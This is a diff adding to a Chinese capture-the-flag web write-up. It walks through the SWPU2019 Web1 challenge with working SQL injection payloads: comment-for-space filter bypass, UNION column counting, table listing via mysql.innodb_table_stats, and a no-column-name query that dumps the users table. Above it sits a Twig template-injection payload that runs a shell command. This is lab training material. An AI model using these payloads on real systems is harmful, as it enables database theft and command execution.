@@ -1537,3 +1537,80 @@ ID测试，不是SQL注入，测试`{{1+1}}`
 `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /f*")}}`
 
 ![image-20201213145633846](Buuoj-WEB-Write-up/image-20201213145633846.png)
+
+
+
+---
+
+
+
+# [SWPU2019]Web1
+
+注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入
+
+过滤` `,`+`,`or`,`and`等
+
+空格用`/**/`替换
+
+尝试爆列数，好家伙，22列
+
+```
+1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'	
+```
+
+回显点在2,3
+
+查一下数据库名
+
+```
+1'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+![image-20201213173543614](Buuoj-WEB-Write-up/image-20201213173543614.png)
+
+库名web1
+
+因为ban了`or`,所以`information_schema`,这时有`mysql.innodb_table_stats`，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql>5.6.x 可使用
+
+[mariadb链接]( https://mariadb.com/kb/en/mysqlinnodb_table_stats/ )
+
+查表
+
+```
+1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+![image-20201213173634852](Buuoj-WEB-Write-up/image-20201213173634852.png)
+
+表名` FLAG_TABLE`,`news`,`users`,`gtid_slave_pos`,`ads`,`users `
+
+##### 无列名注入
+
+```
+1'union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+
+
+原型
+
+```
+1'union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+
+
+2处是回显点，所以对2出注入，首先联合查询
+
+然后分析`(select group_concat(a) from(select 1,2,3 as a union select * from users)x)`
+
+确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 
+
+采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 
+
+`(select 1,2,3 as a union select * from users)`
+
+将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接`group_concat(a)`可得结果
+
+![image-20201213175809048](Buuoj-WEB-Write-up/image-20201213175809048.png)
+
